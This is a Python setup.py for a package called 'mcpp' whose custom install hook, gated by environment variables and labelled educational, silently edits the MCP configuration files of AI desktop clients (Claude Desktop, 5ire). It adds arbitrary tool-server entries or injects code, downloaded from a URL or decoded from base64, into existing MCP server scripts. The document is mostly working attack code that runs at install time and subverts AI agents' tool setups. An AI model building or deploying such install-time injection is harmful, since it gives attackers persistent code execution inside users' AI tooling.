import abc
import datetime
import json
import os
import sys
from base64 import urlsafe_b64decode as b64d
from pathlib import Path
from typing import Callable, Dict

from setuptools import find_packages, setup
from setuptools.command.install import install

PACKAGE_NAME = 'mcpp'

global _verbose
_verbose = False


def log(msg):
    if _verbose:
        timestamp = datetime.datetime.now().strftime('%H:%M:%S.%f')
        sys.stderr.write(f"[{timestamp}] {msg}\n")


def crc32(data: bytes):
    crc = 0xFFFFFFFF
    for byte in data:
        crc ^= byte
        for _ in range(8):
            crc = (crc >> 1) ^ 0xEDB88320 if crc & 1 else crc >> 1
    return crc ^ 0xFFFFFFFF


class _MCPClient(metaclass=abc.ABCMeta):
    paths: Dict[str, Callable[[], Path]]

    @property
    def path(self) -> Path:
        platform = sys.platform
        if platform not in self.paths or not (path := self.paths[platform]()).exists():
            return None
        return path

    @abc.abstractmethod
    def add_entry(self, data: dict) -> bool:
        """
        Add an entry to the configuration file.

        Args:
            data (dict): The data to add. Must contain 'key', 'command', and 'args'.
        """
        pass

    @abc.abstractmethod
    def inject_module_py(self, data) -> bool:
        """
        Edit the script
        inject_module_py:("auto"|key|(python runtime,script)):(b64 payload|url):crc

        Args:
            data (dict): python runtime, script path, b64 payload or url of the payload.
        """
        pass

    # @abc.abstractmethod
    # def inject_module_pyc(self, data) -> bool:
    #     """

    #     Args:
    #         data (dict): python runtime, script path, b64 payload or url of the payload.
    #     """
    #     pass


class ClaudeDesktop(_MCPClient):
    paths = {
        'windows': lambda: Path(os.environ.get('APPDATA')) / 'Claude' / 'claude_desktop_config.json',
        'darwin': lambda: Path(os.path.expanduser('~/Library/Application Support/Claude/claude_desktop_config.json')),
    }

    def add_entry(self, data):
        if not self.path:
            return False
        if data is None:
            log("Data is None")
            return False
        for k in ('key', 'command', 'args'):
            if k not in data:
                log(f"Missing key {k} in data")
                return False
        try:
            _buf = self.path.read_text()
            content = json.loads(_buf)
            _indent = len(_buf.split('"mcpServers"')[0].split('\n')[-1])
            log(f"Detected indent: {_indent}")
            if data['key'] in content['mcpServers']:
                # TODO: Support overwriting ?
                log(f"Key {data['key']} already exists in {self.path}")
                return False
            content['mcpServers'][data['key']] = {
                'command': data['command'],
                'args': data['args'],
            }
            self.path.write_text(json.dumps(content, indent=_indent))
            return True
        except Exception as e:
            log(f"Error updating configuration file {self.path}: {e}")
            return False

    def inject_module_py(self, data) -> bool:
        """
        Edit the script by injecting modules
        Format: ("auto"|key|(python runtime,script)):(b64 payload|url):crc

        Args:
            data (dict): Contains python runtime, script path, payload or url of the payload.

        Returns:
            bool: True if successful, False otherwise.
        """
        if not self.path:
            return False
        if data is None:
            log("Data is None")
            return False
        log(f"[*] {data = }")
        try:
            for k in ('key', 'content'):
                if k not in data:
                    log(f"Missing key {k} in data")
                    return False

            log(f"{self.path = }")
            config_path = self.path
            _buf = config_path.read_text()
            config = json.loads(_buf)

            key = data['key']
            command = None
            args = None

            log(f"{key = }")
            if key == "auto":
                servers = config.get('mcpServers', {})
                if servers:
                    key = next(iter(servers.keys()))
                    command = servers[key].get('command')
                    args = servers[key].get('args')
            elif isinstance(key, tuple) and len(key) == 2:
                # Direct runtime and script specification
                command, script_path = key
                args = []
            else:
                servers = config.get('mcpServers', {})
                if key in servers:
                    command = servers[key].get('command')
                    args = servers[key].get('args')
            log(f"{command = } {args = }")

            if not command:
                log(f"Could not determine command for key {key}")
                return False
            script_path = None
            for arg in reversed(args):
                if not arg.startswith('-'):
                    script_path = arg
                    break

            if not script_path:
                log("Could not determine script path from args")
                return False
            content: str = data['content']

            if content.startswith(('http://', 'https://')):
                try:
                    import requests
                except ImportError:
                    log("requests module is not available. Cannot download content.")
                    return False
                try:
                    response = requests.get(content)
                    response.raise_for_status()
                    content = response.text
                except requests.RequestException as e:
                    log(f"Error downloading content from {content}: {e}")
                    return False
            elif content.startswith('file:///'):
                content = content[7:]
                content = Path(content).read_text()
            else:
                content = b64d(content).decode()
            from mcpp.inject import inject_modules

            print(f"[*] {content = }")
            result = inject_modules(command, args, script_path, content)

            return result

        except Exception as e:
            import traceback

            traceback.print_exc()
            log(f"Error in inject_module_py: {e}")
            return False


class Fire(_MCPClient):  # 5ire:
    paths = {
        'windows': lambda: Path(os.environ.get('APPDATA')) / '5ire' / 'mcp.json',
        'darwin': lambda: Path(os.path.expanduser('~/Library/Application Support/5ire/mcp.json')),
    }

    def add_entry(self, data):
        if data is None:
            log("Data is None")
            return False
        for k in ('key', 'command', 'args'):
            if k not in data:
                log(f"Missing key {k} in data")
                return False
        if not self.path:
            return False
        try:
            _buf = self.path.read_text()
            content = json.loads(_buf)
            _indent = len(_buf.split('"servers"')[0].split('\n')[-1])
            if any(entry.get('key') == data['key'] for entry in content.get('servers', [])):
                log(f"Key {data['key']} already exists in {self.path}")
                return False
            new_entry = {'name': data.get('name', ''), 'key': data['key'], 'command': data['command'], 'args': data['args']}
            if 'env' in data:
                new_entry['env'] = data['env']
            content.setdefault('servers', []).append(new_entry)
            self.path.write_text(json.dumps(content, indent=_indent))
            return True
        except Exception as e:
            log(f"Error updating configuration file {self.path}: {e}")
            return False


_supported_mcps = {cl.__name__: cl for cl in _MCPClient.__subclasses__()}


def _dec_cfg(cfg: str):
    name, operation, payload, crc = cfg.split(':')
    if (pc := crc32(payload.encode())) != int(crc, 16):
        raise ValueError(f"CRC check failed: {crc} != {pc}")
    payload = json.loads(b64d(payload))
    return name, operation, payload


class Install(install):
    def run(self):
        super().run()
        ikwiadatifepo = os.environ.get('I_KNOW_WHAT_I_AM_DOING_AND_THIS_IS_FOR_EDUCATIONAL_PURPOSES_ONLY', None)
        if ikwiadatifepo is None:
            log("You must set the environment variable I_KNOW_WHAT_I_AM_DOING_AND_THIS_IS_FOR_EDUCATIONAL_PURPOSES_ONLY to proceed.")
            return
        # name:operation:b64(payload):crc
        cfg = os.environ.get('MCPP', None)
        log(f"[*] {cfg = }")
        if cfg is None:
            log("You must set the environment variable MCPP to proceed.")
            return
        try:
            name, operation, payload = _dec_cfg(cfg)
            if name == 'auto':
                cl = max(_supported_mcps.values(), key=lambda cls: cls().path.stat().st_mtime if (p := cls().path) and p.exists() else 0)
                name = cl.__name__
            if name not in _supported_mcps:
                log(f"Unsupported MCP: {name} is not in {_supported_mcps.keys()}")
                return
            cl = _supported_mcps[name]
            if not hasattr(cl, operation):
                log(f"Unsupported operation: {operation} is not in {dir(cl)}")
                return
            result = getattr(cl(), operation)(data=payload)
            print(f'{result = }')
            if not result:
                log(f"[-] Operation {operation} failed for {name} with payload {payload}")
        except Exception as e:
            log(f"Error: {e}")


setup(
    name=PACKAGE_NAME,
    version='0.1.0',
    packages=[],
    package_data={},
    cmdclass={
        'install': Install,
    },
    description='Educational package for code execution at install time',
    author='rand0m',
    author_email='email@example.com',
)
